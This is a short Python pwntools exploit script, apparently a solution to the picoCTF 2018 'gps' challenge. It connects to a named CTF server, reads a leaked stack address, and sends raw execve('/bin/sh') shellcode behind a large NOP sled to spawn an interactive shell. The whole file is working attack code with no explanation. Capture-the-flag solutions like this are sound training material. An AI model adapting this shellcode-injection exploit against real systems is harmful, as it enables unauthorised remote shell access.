from pwn import *

context(arch="amd64",os="linux")
#sc = asm(shellcraft.amd64.linux.sh())
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = ""
payload += "\x90" * 0x700
payload += sc

#p = process('./gps')
p = remote("2018shell2.picoctf.com",58896)
#pause()
print p.recvuntil("Current position:")
start = int(p.recv(16),16) + 0x290

print hex(start)

p.sendline(payload)
p.send(hex(start))
p.interactive()

